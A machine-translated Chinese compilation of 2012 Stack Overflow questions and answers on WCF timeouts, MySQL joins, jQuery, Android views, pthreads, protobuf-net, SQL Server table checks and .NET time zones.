    <binding name="WSHttpBinding" closeTimeout="00:01:00" openTimeout="00:01:00" receiveTimeout="00:10:00" sendTimeout="00:01:00" bypassProxyOnLocal="false" transactionFlow="false" hostNameComparisonMode="StrongWildcard" messageEncoding="Text" textEncoding="utf-8" useDefaultWebProxy="true" allowCookies="false" maxBufferPoolSize="2147483646" maxReceivedMessageSize="2147483646">
      <readerQuotas maxDepth="2147483646" maxStringContentLength="2147483646" maxArrayLength="2147483646" maxBytesPerRead="2147483646" maxNameTableCharCount="2147483646" />
      <reliableSession ordered="true" inactivityTimeout="00:10:00" enabled="false" />
      <security>
        <transport></transport>
      </security>
    </binding>
  </wsHttpBinding>
</bindings>
<behaviors>
  <serviceBehaviors>
    <behavior name="ServiceBehavior">
      <serviceMetadata httpGetEnabled="true" />
      <serviceDebug includeExceptionDetailInFaults="true" />
      <serviceAuthorization principalPermissionMode="Custom">
        <authorizationPolicies>
          <add policyType="Kodi.Kodiak.Security.AuthorizationPolicy, Kodi.Kodiak.Security" />
        </authorizationPolicies>
      </serviceAuthorization>
      <serviceCredentials>
        <windowsAuthentication includeWindowsGroups="true" allowAnonymousLogons="false" />
      </serviceCredentials>
      <serviceThrottling maxConcurrentCalls="200" maxConcurrentSessions="200" maxConcurrentInstances="200" />
      <dataContractSerializer maxItemsInObjectGraph="2147483646" />
    </behavior>
  </serviceBehaviors>
  <endpointBehaviors>
    <behavior name="rest">
      <webHttp />
    </behavior>
  </endpointBehaviors>
</behaviors>
<services>
  <service behaviorConfiguration="ServiceBehavior" name="OrderManagementService">
    <endpoint address="" binding="wsHttpBinding" bindingConfiguration="WSHttpBinding" contract="Kodi.Kodiak.Services.ServiceContracts.IOrderManagementService" />
    <endpoint address="mex" binding="mexHttpBinding" contract="IMetadataExchange" />
  </service>
</services> 
```

弹簧配置

```
<object id="OrderManagementService"
    singleton="false"
    type="Kodi.Kodiak.Services.OrderManagementService, Kodi.Kodiak.Services"
    scope="session">
 </object> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-09T16:53:06.920

客户如何调用服务？如果他们通过`SvcUtil`生成的代理调用服务；*他们是否正确关闭了代理连接？*我认为客户端没有关闭连接，或者只是连接没有正确关闭。

一件重要的事情是，您应该避免`using`在创建代理时使用语句。

更好的方法是这样的，

```
ServiceClient client = null;

try
{
  client = new ServiceClient();
  client.CallMethod();
}
finally
{
  client.CloseConnection(); // extension method
}

public static void CloseConnection(this ICommunicationObject client)
{
   if (client.State != CommunicationState.Opened)
   {
      return;
   }

   try
   {
      client.Close();
   } 
   catch (CommunicationException)
   {
      client.Abort();
      throw;
   }
   catch (TimeoutException)
   {
      client.Abort();
      throw;
   }
   catch (Exception)
   {
      client.Abort();
      throw;
   }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-16T08:51:48.723

我认为这可以通过保持客户端和服务器绑定端点和行为相同来完成，客户端和服务器配置**中指定的超时值应该相同**。

# mysql - 如果不存在子集，则选择全部，否则选择子集

> ID：11309572
> 
> 赞同：1
> 
> 时间：2012-07-03T11:03:19.820
> 
> 标签：mysql, select, join

好的，这是我的问题。假设客户可以访问 CustomerRegions 表中定义的多个区域：

```
CustomerRegionID | CustomerID | RegionID
----------------------------------------
               1 |          1 |        1
               2 |          1 |        2 
```

假设客户 1 有三个用户 1、2 和 3。对于每个用户，我们可以通过表 UserRegions 指定他们可以访问哪些 CustomerRegions：

```
UserRegionID | UserID | CustomerRegionID
----------------------------------------
           1 |      1 |                1
           2 |      1 |                2
           3 |      2 |                2 
```

因此，用户 1 将有权访问 Customerregions，而用户 2 将只能访问 CustomerRegion 2。

如果为给定用户指定了 UserRegions，则只有那些 CustomerRegions 出现在结果集中，但如果没有为给定用户指定 UserRegions，则所有 CustomerRegions 都出现在结果中。我想获得给定客户的每个用户的所有可访问区域。我正在寻找的结果是这样的：

```
CustomerID | UserID | RegionID
------------------------------
         1 |      1 |        1
         1 |      1 |        2
         1 |      2 |        2
         1 |      3 |        1
         1 |      3 |        2 
```

我的问题是这可以在一个查询中完成吗？如何？

编辑：我似乎现在可以工作了：

```
SELECT CustomerID, 
    UserID, 
    RegionID
FROM users 
LEFT JOIN customerregions ON customerregions.CustomerID = users.CustomerID 
LEFT JOIN userregions ON userregions.UserID = users.UserID AND userregions.CustomerRegionID = customerregions.CustomerRegionID 
LEFT JOIN regions ON regions.RegionID = customerregions.RegionID 
WHERE (userregions.UserID IS NOT NULL 
    OR (SELECT COUNT(1) FROM userregions WHERE userregions.UserID = users.UserID) = 0)
    AND CustomerID = 1 
```

where 中的额外计数查询似乎可以解决问题。感谢@Pablo Martinez 的帮助。但是，如果有人知道更好的方法来做到这一点，请告诉我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-03T11:29:23.287

我同意@diEcho，表结构非常混乱

你尝试加入吗？

```
Select CustomerID, UserID, RegionID 
    from UserRegions join CustomerRegion 
         on  CustomerRegion.CustomerRegionID=UserRegions.CustomerRegionID  
    where customerID=1 
```

# jquery - 在获取 Json 期间禁用控件

> ID：11309588
> 
> 赞同：1
> 
> 时间：2012-07-03T11:04:12.883
> 
> 标签：jquery, asp.net-mvc, json

在 ASP.NET MVC 中，我使用 JSON 和 jquery 来获取图表数据。有没有办法在数据加载和图表绘制时禁用控件并设置光标等待？我的代码摘要是

```
<script type="text/javascript">
     $(document).ready(function () {
            $.getJSON(
                '@Url.Action("JsonPlot", "Home")',
                function (chartData) {
                    var plot1 = $.jqplot('chartdiv', [points], {...});
           });              
        });
</script> 
```

我可以放在哪里

```
$("*").attr("disabled", "disabled");
$('body').css('cursor', 'wait'); 
```

进而

```
$("*").removeAttr('disabled');
$('body').css('cursor', 'auto'); 
```

?

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-03T11:07:26.013

```
$(document).ready(function () {
$("*").attr("disabled", "disabled");
$('body').css('cursor', 'wait');

            $.getJSON(
                '@Url.Action("JsonPlot", "Home")',
                success:function (chartData) {
                    var plot1 = $.jqplot('chartdiv', [points], {...});
                     $("*").removeAttr('disabled');
                     $('body').css('cursor', 'auto');

           });              
        }); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-03T11:19:30.817

要充分利用 jQuery AJAX 回调，您应该使用`$.ajax`：

```
$.ajax({
    url: '@Url.Action("JsonPlot", "Home")',
    dataType: 'json',
    beforeSend: function() {
        /* Disable UI */
    },
    success: function( data ) {
        /* Update UI using server response */
    },
    complete: function() {
        /* Enable UI again, regardless of whether 
           server call was successful or not*/
    },
    error: function(jqXHR, textStatus) {
        /* Display error message to user */
    }

}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-03T11:10:18.200

您可以使用 jQuery 方法：ajaxStart() 和 ajaxStop()。

# geometry - 如何在给定角度的椭圆轮廓上得到一个点？

> ID：11309596
> 
> 赞同：2
> 
> 时间：2012-07-03T11:04:31.740
> 
> 标签：geometry, ellipse

所以，我给出了椭圆——它们由它们的中点、水平半径（rh）和垂直半径（rv）定义。我正在使用 sin/cos 绘制它们，结果对我来说看起来相当不错（只是确保这不是错误源）。

现在说我有一个给定的角度（或方向向量），我希望椭圆轮廓上的点具有该角度/方向。我直观的方法是简单地使用方向向量，对其进行归一化并将其 x 分量与 rh 相乘，将其 y 分量与 rv 相乘。现在，我编写的程序和我在纸上所做的所有计算都不是我想要的点，而是另一个点，尽管它仍然在椭圆的轮廓上。但是，如果方向是 (1,0)、(0, 1)、(-1, 0)、(0, -1) 之一，则此方法工作得很好，（因此它适用于 0°、90°、 180°、270°）。

尽管互联网上有大量关于椭圆本身的数据，但我找不到任何关于我的特定问题的信息——而且我想不出比上述更好的解决方案。

那么，知道如何实现这一目标吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-03T20:38:11.640

如果我理解您的要求，那么我认为您需要的是[**椭圆的极坐标形式，**](http://en.wikipedia.org/wiki/Ellipse#Polar_form_relative_to_center)其中角度是从椭圆中心测量的。使用这种椭圆形式，您将能够针对给定的 theta 选择评估椭圆半径值，然后绘制您的点。

如果你看一下这个 gif 图像，你会明白为什么使用**参数角度****只能**在 theta = 90、180、270 和 360 度时给出正确的结果[http://en.wikipedia.org/wiki/File:Parametric_ellipse。 .gif](http://en.wikipedia.org/wiki/File:Parametric_ellipse.gif) _ 使用椭圆的极坐标形式，你应该得到你想要的点。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-03T15:23:55.353

你是对的 - 参数角度*与*所需点和 X 轴之间的角度不同。但是，它们的切线是成比例的（系数为`rh/rv`），因此您可以使用这种方法：

*   得到所需角度的正切
*   将此切线乘以`rh/rv`
*   使用[三角恒等式](http://en.wikipedia.org/wiki/List_of_trigonometric_identities#Related_identities)从切线计算正弦和余弦
*   根据参数（中点、rh、rv）缩放/定位点

在 Python 中：

```
from math import copysign, cos, sin, sqrt

class Ellipse:

        def __init__(self, mx, my, rh, rv):
                self.mx = mx
                self.my = my
                self.rh = rh
                self.rv = rv

        def pointFromAngle(self, a):
                c = cos(a)
                s = sin(a)
                ta = s / c  ## tan(a)
                tt = ta * self.rh / self.rv  ## tan(t)
                d = 1\. / sqrt(1\. + tt * tt)
                x = self.mx + copysign(self.rh * d, c)
                y = self.my + copysign(self.rv * tt * d, s)
                return x, y 
```

# android - GridLayout项目如何来自Android App中的Adapter(List/Image)

> ID：11309597
> 
> 赞同：4
> 
> 时间：2012-07-03T11:04:36.530
> 
> 标签：android, grid, adapter, listadapter, grid-layout

是否可以从Android 中**的适配器****获取*GridLayout项目。***

就像，GridView 中的项目来自与此视图关联的 ListAdapter。

请澄清我的疑问..谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-04T11:01:02.283

Gridlayout 没有任何适配器，因为它不是从 AbsListView 派生的。只有 GridView 带有适配器。

* * *

## 回答 #2

> 赞同：-3
> 
> 时间：2012-07-03T12:42:07.750

是的，有可能。你不说你用什么来创建 GridView。以下是单击网格单元格时从光标获取数据的示例（并将其放入调用另一个活动的意图中）：

```
 gridview.setOnItemClickListener(new OnItemClickListener() {
        public void onItemClick(AdapterView<?> parent, View v,
                int position, long id) {

            Cursor c = (Cursor) (parent.getAdapter().getItem(position));
            Intent i = new Intent(mCtx, ScheduleEdit.class);
            i.putExtra("RowId", position);
            i.putExtra("Machine", c.getString(c
                    .getColumnIndex(ScheduleDBAdapter.SCHEDULE_MACHINE)));
            i.putExtra("Priority", c.getString(c
                    .getColumnIndex(ScheduleDBAdapter.SCHEDULE_PRIORITY)));
            i.putExtra("RunJob", c.getString(c
                    .getColumnIndex(ScheduleDBAdapter.SCHEDULE_RUNJOB)));
            i.putExtra("Operator", c.getString(c
                    .getColumnIndex(ScheduleDBAdapter.SCHEDULE_OPERATOR)));
            i.putExtra("NxtJob1", c.getString(c
                    .getColumnIndex(ScheduleDBAdapter.SCHEDULE_NXTJOB1)));
            i.putExtra("NxtJob2", c.getString(c
                    .getColumnIndex(ScheduleDBAdapter.SCHEDULE_NXTJOB2)));
            startActivityForResult(i, ACTIVITY_EDIT);
        }
    }); 
```

# ios5 - 如何将回调值传递给 JavaScript 形式的 iOS 原生代码？

> ID：11309602
> 
> 赞同：3
> 
> 时间：2012-07-03T11:04:52.233
> 
> 标签：ios5, ios4, cordova, phonegap-plugins

我正在为 iOS 创建 phoneGap 插件，它使用 NativeCode 绘制签名并将回调值传递给 JavaScript。

我可以使用 natice 代码成功绘制签名，但我无法将保存的签名的返回值传递给 JavaScript。

JavaScript 代码如下

```
var MyPlugin = {
 nativeFunction: function(types, success, fail) {
      return Cordova.exec(success, fail, "MyPlugin", "print", types);
 }
}; 
```

在“打印”函数中，我调用了一个绘制签名的 UIViewContoller 类，在“保存”按钮上，我想将返回值传递给 JavaScript。

保存按钮上的代码单击

```
// The first argument in the arguments parameter is the callbackID.
// We use this to send data back to the successCallback or failureCallback
// through PluginResult
self.callbackID = [arguments pop];

// Get the string that javascript sent us
NSString *stringObtainedFromJavascript = [arguments objectAtIndex:0];                 

// Create the Message that we wish to send to javascript   
NSMutableString *stringToReturn = [NSMutableString stringWithString: @"StringReceived:"];

// Append the received string to the string we plan to send out        
[stringToReturn appendString: stringObtainedFromJavascript];

// Create Plugin Result 
CDVPluginResult* pluginResult = [CDVPluginResult resultWithStatus:CDVCommandStatus_OK
                                                  messageAsString: [stringToReturn stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding]];

// Checking if the string received is HelloWorld or not    
 if ([stringObtainedFromJavascript isEqualToString:@"SAVED"] == YES)    
 {   
 // Call the javascript success function
 [self writeJavascript: [pluginResult toSuccessCallbackString:self.callbackID]];
 }else    
 {    
 // Call the javascript error function
 [self writeJavascript: [pluginResult toErrorCallbackString:self.callbackID]];
 } 
```

我没有收到任何错误或任何异常。

谁能帮帮我。任何建议将不胜感激。

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-09T00:00:14.707

看看这个 GitHub 项目：[https ://github.com/rohdef/PGPlugins](https://github.com/rohdef/PGPlugins)

有一些为 phonegap 编写插件的好例子。

# c - 将链表节点正确传递给 pthread 函数

> ID：11309603
> 
> 赞同：1
> 
> 时间：2012-07-03T11:04:54.287
> 
> 标签：c, pthreads, linked-list

请在下面查看我的伪代码。代码注释应该解释我的问题。我对 C 中的 pthreads 和链表都是新手，所以我已经跳入了深层次。我只需要`str`在函数中打印 out 的值`thread_work`。代码的顺序位很好，但是当每个线程执行其工作时，它无法打印出`str`.

```
// linked list definition
struct linked_list {
   char *str;
   struct linked_list *next;
};

// linked list initiation
struct linked_list *root;
struct linked_list *next_info;
root = malloc( sizeof( struct linked_list ) );

// main code
some loop {
   next_node->str = str;
   printf( "%s\n", next_node ); // PRINTS FINE
   pthread_t thread;
   rc = pthread_create( &thread, NULL, thread_work, (void *) &next_node );
   next_node->next = malloc( sizeof( struct linked_list ) );
   next_node = next_node->next;
}

// code executed by each thread
void *thread_work( void *thread_arg ) {
   struct linked_list *ll;
   ll = ( struct linked_list * )thread_arg;
   printf( "%s\n", ll->str ); // PRINTS SOME MESS (��E#)
} 
```

在我的实际代码中，还有一些`linked_list` `struct`.

非常感谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-03T11:08:47.003

您有一个指针类型不匹配：您正在传递一个指向列表节点指针的指针，但在内部 `thread_work`您将其视为指向节点的指针。`next_node`在调用之前删除与`pthread_create`号，或更改`thread_work`如下：

```
void *thread_work( void *thread_arg ) {
    struct linked_list **llp, *ll;
    llp = ( struct linked_list ** )thread_arg;
    ll = *llp;
    printf( "%s\n", ll->str ); // PRINTS SOME GOOD STUFF
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T11:10:02.520

如果`printf( "%s\n", next_node )`工作正常，*next_node*是一个指针，因此你不应该指向*pthread_create()*中的指针。*next_node*的定义会很好；）

尝试`rc = pthread_create( &thread, NULL, thread_work, (void *) next_node );`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-03T11:47:10.240

这段代码很糟糕：

```
// main code
some loop {
  next_node->str = str;
  printf( "%s\n", next_node ); // PRINTS FINE
  pthread_t thread;
  rc = pthread_create( &thread, NULL, thread_work, (void *) &next_node );
  next_node->next = malloc( sizeof( struct linked_list ) );
  next_node = next_node->next;
} 
```

这里的问题是您传递一个指向变量的指针，该变量的值在调用`pthread_create`. 由于操作系统将进程克隆到新线程中需要一些时间，因此实际`thread_work`可能（并且在大多数情况下将）在`next_node = next_node->next;`语句执行后开始并选择错误的`next_node`. 您应该传递 的值`next_node`，而不是其地址：

```
// main code
some loop {
  next_node->str = str;
  printf( "%s\n", next_node->str ); // PRINTS FINE
  pthread_t thread;
  rc = pthread_create( &thread, NULL, thread_work, (void *) next_node );
  // Store this thread handle somewhere safe to be able to join the thread later on
  next_node->next = malloc( sizeof( struct linked_list ) );
  next_node->next->str = next_node->next->next = NULL; // Always a good idea
  next_node = next_node->next;
} 
```

# android - 如何在android中为textview获得像listview这样的选择外观

> ID：11309611
> 
> 赞同：2
> 
> 时间：2012-07-03T11:06:01.190
> 
> 标签：android

我有一个文本视图，其中有一些文本。现在，如果我点击 textview，我想要像 listview 这样的部分外观。当我按下文本时，它应该显示选择外观，怎么办？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-03T11:09:25.010

使用选择器[链接](http://developer.android.com/guide/topics/resources/drawable-resource.html#StateList)

```
<?xml version="1.0" encoding="utf-8"?>
<selector xmlns:android="http://schemas.android.com/apk/res/android">
    <item android:state_pressed="true"
          android:drawable="@drawable/button_pressed" /> <!-- pressed -->
    <item android:state_focused="true"
          android:drawable="@drawable/button_focused" /> <!-- focused -->
    <item android:state_hovered="true"
          android:drawable="@drawable/button_focused" /> <!-- hovered -->
    <item android:drawable="@drawable/button_normal" /> <!-- default -->
</selector> 
```

# jquery - Fancybox 组图像没有重复

> ID：11309612
> 
> 赞同：0
> 
> 时间：2012-07-03T11:06:02.147
> 
> 标签：jquery, fancybox

如何使用fancybox对多个图像进行分组而没有任何重复？我试过使用 rel="group" 虽然这要么显示最近图像的列表。

我有以下 HTML：

```
<ul>    
    <li>        
        <a rel="group1" class="fancy" title="Custom title" href="http://farm3.static.flickr.com/2641/4163443812_df0b200930.jpg">            <img alt="" src="http://farm3.static.flickr.com/2641/4163443812_df0b200930_m.jpg">        </a>        
        <h2><a rel="group1" class="fancy" title="Custom title" href="http://farm3.static.flickr.com/2641/4163443812_df0b200930.jpg">Test title about image</a></h2>    
    </li>    
    <li>        
        <a rel="group2" class="fancy" title="Custom title" href="http://farm3.static.flickr.com/2641/4163443812_df0b200930.jpg">            
            <img alt="" src="http://farm3.static.flickr.com/2641/4163443812_df0b200930_m.jpg">        
        </a>        
        <h2><a rel="group2" class="fancy" title="Custom title" href="http://farm3.static.flickr.com/2641/4163443812_df0b200930.jpg">Test title about image</a></h2>    
    </li>    
    <li>        
        <a rel="group3" class="fancy" title="Custom title" href="http://farm3.static.flickr.com/2641/4163443812_df0b200930.jpg">            
            <img alt="" src="http://farm3.static.flickr.com/2641/4163443812_df0b200930_m.jpg">        
        </a>        
        <h2><a rel="group3" class="fancy" title="Custom title" href="http://farm3.static.flickr.com/2641/4163443812_df0b200930.jpg">Test title about image</a></h2>    
    </li>    
    <li>        
        <a rel="group4" class="fancy" title="Custom title" href="http://farm3.static.flickr.com/2641/4163443812_df0b200930.jpg">            
            <img alt="" src="http://farm3.static.flickr.com/2641/4163443812_df0b200930_m.jpg">        
        </a>        
        <h2><a rel="group4" class="fancy" title="Custom title" href="http://farm3.static.flickr.com/2641/4163443812_df0b200930.jpg">Test title about image</a></h2>    
    </li>
</ul> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-03T12:11:59.787

您可以触发“花式”链接的点击事件，如下所示 - [http://jsfiddle.net/K44HR/](http://jsfiddle.net/K44HR/)

（如果需要，调整 jQuery 选择器）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T13:12:49.093

现在不是那么容易：

```
<li>        
        <a rel="group1" class="fancy" title="Custom title" href="http://farm3.static.flickr.com/2641/4163443812_df0b200930.jpg">            
            <img alt="" src="http://farm3.static.flickr.com/2641/4163443812_df0b200930_m.jpg">        
        </a>        
        <h2><a rel="group2" class="fancy" title="Custom title" href="http://farm3.static.flickr.com/2641/4163443812_df0b200930.jpg">Test title about image</a></h2>    
    </li> 
```

# android - Android 4.0 上 Millennial Media 横幅中的白色矩形区域

> ID：11309614
> 
> 赞同：0
> 
> 时间：2012-07-03T11:06:13.467
> 
> 标签：android, android-4.0-ice-cream-sandwich, millennial-media

在我的游戏中，我同时实现了 Millennial Media 和 Admob 横幅（Millennial 在屏幕顶部，Admob 在底部）。一切都是使用RelativeLayout在Android/Java中以编程方式完成的，首先我添加MMAdView，然后是OpenGl表面，最后是AdmobView。在 Android < 4.0 的设备上，一切都正确绘制，但在冰淇淋三明治上，有一个巨大的白色区域，而不是千禧年横幅。我已经为这个问题苦苦挣扎太久了。有什么想法可能有什么问题吗？
更新：我的朋友告诉我，当他没有连接到 Wifi 网络时，这个白色矩形区域是可见的。在我的代码中，我没有对网络可用性进行任何检查。我只是触发 millennialView.setVisibility(View.VISIBLE) 方法来显示横幅。

```
 adMobView = new AdView(this, AdSize.BANNER, ADMOB_BANNER_ID);
    adMobView.setAdListener(getAdMobListener());
    AdRequest request = new AdRequest();
    adMobView.loadAd(request);

    RelativeLayout.LayoutParams lay = new RelativeLayout.LayoutParams(RelativeLayout.LayoutParams.WRAP_CONTENT, RelativeLayout.LayoutParams.WRAP_CONTENT);
    lay.addRule(RelativeLayout.ALIGN_PARENT_BOTTOM);        
    layout.addView(adMobView, lay);

// ... adding OpenGL surface

    int bannerWidth = (int)(displayMetrics.widthPixels * displayMetrics.density);

    Hashtable<String, String> map = new Hashtable<String, String>();
    map.put(MMAdView.KEY_WIDTH, String.valueOf(bannerWidth));
    map.put(MMAdView.KEY_HEIGHT, "53");
    millennialView = new MMAdView(this, MILLENNIAL_BANNER_ID, MMAdView.BANNER_AD_TOP, 30, map);
    millennialView.setId(MMAdViewSDK.DEFAULT_VIEWID);
    millennialView.setListener(getMillennialListener()); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-05T15:05:10.200

问题似乎是网络不可用时显示千禧年横幅。现在，在展示横幅之前，我只需检查是否有网络连接：

```
 ConnectivityManager connectivityMgr =
        (ConnectivityManager)getSystemService(Context.CONNECTIVITY_SERVICE);
    if(connectivityMgr != null && connectivityMgr.getActiveNetworkInfo() != null) {
            millennialView.setVisibility(View.VISIBLE); 
```

# android - 如何让倒数计时器在android的后台运行？

> ID：11309616
> 
> 赞同：3
> 
> 时间：2012-07-03T11:06:22.887
> 
> 标签：android

如果我想在用户直接单击后退按钮时将该计时器置于后台，我现在正在使用意图撤销 android 中的计时器，那么我该怎么做？然后当我看到后台应用程序正在运行时，它应该可以工作并且可以放在前面。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-03T11:46:45.310

The problem is that if you define the counter in your Activity, the counter is bound to the Activity life-cycle. In order to workaround this, you can create your counter in a [Service](http://developer.android.com/reference/android/app/Service.html) and just visualize the value in Activity.

There are also several techniques which you can use when defining the counter inside the Activity. Using [SystemClock](http://developer.android.com/reference/android/os/SystemClock.html) to track the time in your Activity in onStart() and onStop() for example, you can manually calculate the difference between those two values and adjust accordingly your counter.

# android - 修改图层列表可绘制xml中的项目

> ID：11309621
> 
> 赞同：5
> 
> 时间：2012-07-03T11:06:38.837
> 
> 标签：android, android-drawable

我的问题很简单，我在`drawable`文件夹中有这个文件：`popup1.xml`

```
<?xml version="1.0" encoding="utf-8"?>
<layer-list xmlns:android="http://schemas.android.com/apk/res/android">

    <item android:left="8dp" android:id="@+id/bm1b" >
        <bitmap android:src="@drawable/flepop01" android:gravity="top|left"  ></bitmap>        
    </item>

</layer-list> 
```

如何从我的 Activity 以编程方式修改属性“left”的值？

# protobuf-net - 基于 c# 类获取 *.proto 文件

> ID：11309623
> 
> 赞同：4
> 
> 时间：2012-07-03T11:06:44.887
> 
> 标签：protobuf-net

我有以下用例：有几个用 ProtoContract 类装饰的程序集，我想基于程序集生成 proto 文件。所以问题是如何做到这一点？

我的第一个意图是使用 Serailizer.GetProto 但它是通用方法，对我不起作用，因为我只知道运行时的类类型。

另外为什么在 r480 GetProto 中没有执行？

我也知道 VS08/10，但在我的场景中似乎没有帮助。

提前致谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-03T11:13:25.717

您可以通过`Serializer.GetProto`一点反思来使用该方法：

```
var method = typeof(Serializer).GetMethod("GetProto").MakeGenericMethod(type);
Func<string> getProto = Delegate.CreateDelegate(typeof(Func<string>), method);
var proto = getProto(); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-07-03T11:49:17.900

> 另外为什么在 r480 GetProto 中没有执行？

因为我时间有限，要求很多。最近有很多人问我`GetProto`，所以我把它放在我的名单上。我必须优先考虑功能方面的好处，努力反对可能的使用。`GetProto`不是序列化的“核心”，而是我想继续支持的东西。只是需要努力。这个特性的使用让我觉得延迟 v2 代码库是不合理的。

好消息是 v2 的核心是非泛型的，保留旧的泛型 API 纯粹是为了兼容。因此，当我*重新*实现它时，它完全可以在没有泛型的情况下使用。

* * *

更新：在 r545 中已对此进行了实验性剪辑。它通过了 v1 测试，但是：关于此功能的 v1 测试并不多！所以：我很快就会为此添加更多测试。

# java - 检查表是否存在sql server

> ID：11309627
> 
> 赞同：1
> 
> 时间：2012-07-03T11:07:03.150
> 
> 标签：java, sql-server

> **可能重复：**
> [SQL Server：检查表是否存在](https://stackoverflow.com/questions/167576/sql-server-check-if-table-exists)

我正在使用 Java 和 MS SQL Server 2008，我只想在检查数据库中是否不存在该表后创建一个表。

```
 public void addTestTable(){
  jdbcTemplate.execute(
            "create table [mydatabase].[dbo].[test] (ID integer not null identity, CREATEDBY varchar(50), CREATEDAT datetime, TITLE varchar(50), NRQUEST int, FORGROUP int, primary key(id))"

            ); 
```

}

这是我的 createTable 函数，我需要另一个布尔函数来检查表是否已经存在，但我不知道如何为其编写 sql 语句。有人可以帮我吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-03T11:15:13.710

```
IF OBJECT_ID('tablename','U') is not null
-- table exists 
```

或者

```
SELECT *
   FROM sys.tables
   WHERE name = 'mytable'
   AND schema_id = SCHEMA_ID('myschema') 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T11:44:06.543

```
 if not exists(select 1 from sys.tables where name ='test' and schema_id = SCHEMA_ID('dbo'))
begin
  create table [dbo].[test] (ID integer not null identity, CREATEDBY varchar(50), 
  CREATEDAT datetime, TITLE varchar(50), NRQUEST int, FORGROUP int, primary key(id)) 
  print 'table created'
end
go 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-03T11:23:15.083

```
IF NOT EXISTS (SELECT * 
                 FROM INFORMATION_SCHEMA.TABLES 
                 WHERE TABLE_SCHEMA = 'testSchema' 
                 AND  TABLE_NAME = 'testTable')
BEGIN
    --create table
END 
```

# c# - TimeZoneInfo 是否考虑夏令时？

> ID：11309631
> 
> 赞同：13
> 
> 时间：2012-07-03T11:07:19.313
> 
> 标签：c#, timezone, dst

C# 在时区之间转换时是否考虑夏令时？

我有一个伦敦当前时间的源日期，我想将其转换为我的时区 (CET)。这是我正在使用的代码。

```
DateTime time = DateTime.ParseExact(timeString, "HH:mm", null);
time = DateTime.SpecifyKind(time, DateTimeKind.Unspecified);

//Convert it to the right timezone. It is currently in GMT

TimeZoneInfo gmt = TimeZoneInfo.FindSystemTimeZoneById("GMT Standard Time");
TimeZoneInfo current = TimeZoneInfo.Local;

DateTime utc = TimeZoneInfo.ConvertTimeToUtc(time, gmt);
DateTime local = TimeZoneInfo.ConvertTimeFromUtc(utc, core.startTime = local; 
```

目前运行良好。然而，当 DST 抬起丑陋的脑袋时，它会继续工作还是会严重崩溃？由于过去有很多问题，我对 TimeZones 有点警惕。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-03T11:28:18.500

简短的回答是“不是无处不在，也不是完美的”。

* * *

TimeZoneInfo.GetAdjustmentRules 将为您提供有关 DST 偏移量更改以及它们何时生效和失效的规则集合。

但是，您的用户仍然可以通过取消选中 Windows 控制面板日期和时间中的“自动调整夏令时”来解决问题。如果在 Windows 中关闭了 DST，那么您将获得一个空的调整规则集合。

如果您想自动应用调整规则，您必须使用已设置 DateTimeKind 的 DateTime 对象。如果 DST 关闭，这将在转换中得到遵守。

GMT 是格林威治皇家天文台的太阳时。英国人发明了从日期线偏移时区的整个业务，因为他们是第一个在全球范围内协调任何事情的人。在过去的平静日子里，他们拥有遍布全球的帆船海军，但没有无线电。订单滞后数周或数月，因此一致、精确的全球计时是唯一一个拥有比行星更大的参考系的人——皇家天文学家——发明的。

月球的潮汐力正在减缓地球的自转。需要大量的果汁才能让海水上下晃动，这不是魔法，它来自地球的旋转时刻。

此外，太阳轨道的持续时间也不是恒定的，所以我们不时有闰秒来同步日历与行星现实。另一方面，恒星时没有这种愚蠢，所以我们远离它。然后是相对论漂移。GPS 卫星移动得如此之快，以至于它们实际上必须补偿轻微的时间扭曲。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T14:03:26.580

在 .NET 中处理 1987 年之前的日期时要小心。TimeZoneInfo 中您感兴趣的时区的默认 AdjustmentRules 可能不足以满足您的目的。在这里阅读更多：http: [//blog.appliedis.com/2013/03/06/beware-daylight-saving-time-transitions-in-dot-net/](http://blog.appliedis.com/2013/03/06/beware-daylight-saving-time-transitions-in-dot-net/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-03T12:22:09.487

> C# 在时区之间转换时是否考虑夏令时？

是的，假设您的计算机保持更新，因为时区信息有时会通过 Windows 更新进行更新。如果该国家/地区没有更改其 DST 时间段，即使没有 Windows 更新，它也应该仍然有效（最近发生在澳大利亚）

> 我有一个伦敦当前时间的源日期，我想将其转换为我的时区 (CET)

你是什​​么意思'源日期是伦敦的当前时间'？始终将您的日期存储为 UTC 并将它们“在最后一分钟”转换为所需的本地时间。

如果您想知道夏令时更改时会发生什么，那么您可以通过更改计算机上的时钟来测试这一点。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-07-10T05:47:41.467

至少在.net 4.5 TimeZoneInfo 确实处理夏令时。

检查它的最简单方法是比较 BaseUtcOffset 和 GetUtcOffset

```
 var baseOffset = timeZoneInfo.BaseUtcOffset;
   var currentOffset = timeZoneInfo.GetUtcOffset(currentLocalTime);
   var isDst = currentOffset > baseOffset;
   var delta = currentOffset - baseOffset; 
```

